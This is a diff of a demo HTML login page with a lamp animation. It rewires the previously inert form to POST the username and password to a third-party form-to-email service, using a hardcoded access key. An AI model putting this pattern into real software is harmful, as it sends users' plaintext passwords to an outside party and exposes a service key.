@@ -3,14 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login Interativo com Abajur</title>
-  <!-- Link conectando o CSS -->
+  <title>Login Form Lamp Animation</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
   <div class="container">
-    <!-- Estrutura do Abajur -->
+    <!-- Abajur / Lampada -->
     <div class="lamp-wrapper">
       <div class="lamp">
         <div class="shade"></div>
@@ -23,18 +22,21 @@
       </div>
     </div>
 
-    <!-- Estrutura do Formulário de Login -->
+    <!-- Formulario de Login com integração do Web3Forms -->
     <div class="login-form">
       <h2>Welcome</h2>
-      <form onsubmit="return false;">
+      <form action="https://api.web3forms.com/submit" method="POST">
+        <!-- Chave do Web3Forms -->
+        <input type="hidden" name="access_key" value="6bb64ee2-8f17-4f80-bcda-d971f6ec285d" />
+
         <div class="form-group">
           <label for="username">Username</label>
-          <input type="text" id="username" placeholder="Enter name" autocomplete="off" />
+          <input type="text" id="username" name="username" placeholder="Enter name" required autocomplete="off" />
         </div>
 
         <div class="form-group">
           <label for="password">Password</label>
-          <input type="password" id="password" placeholder="Enter Password" />
+          <input type="password" id="password" name="password" placeholder="Enter Password" required />
         </div>
 
         <button class="login-btn" type="submit">Sign In</button>
@@ -42,7 +44,6 @@
     </div>
   </div>
 
-  <!-- Link conectando o JavaScript -->
   <script src="script.js"></script>
 </body>
 </html>
